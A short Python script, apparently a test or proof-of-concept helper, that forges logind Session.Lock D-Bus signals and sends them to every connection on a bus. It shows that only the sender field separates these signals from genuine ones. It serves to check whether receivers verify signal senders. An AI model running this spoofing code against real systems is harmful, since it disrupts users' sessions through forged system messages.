#!/usr/bin/env python3
"""A local client that is not logind, sending Session.Lock to everyone.

    spoof_lock.py ADDRESS SESSION_PATH

Sends a unicast org.freedesktop.login1.Session.Lock signal on SESSION_PATH to
every other connection on the bus. The bus delivers a unicast signal whatever
match rules the receiver added, so only the sender tells it from logind's.
"""

import sys

from jeepney import DBusAddress, new_method_call, new_signal
from jeepney.bus_messages import DBus
from jeepney.io.blocking import open_dbus_connection
from jeepney.low_level import HeaderFields

address, session_path = sys.argv[1], sys.argv[2]
conn = open_dbus_connection(bus=address)
names = conn.send_and_get_reply(new_method_call(DBus(), "ListNames")).body[0]
for name in names:
    if name.startswith(":") and name != conn.unique_name:
        signal = new_signal(DBusAddress(session_path, interface="org.freedesktop.login1.Session"), "Lock")
        signal.header.fields[HeaderFields.destination] = name
        conn.send(signal)
# A round trip, so the bus has taken the signals before this process exits.
conn.send_and_get_reply(new_method_call(DBus(), "GetId"))
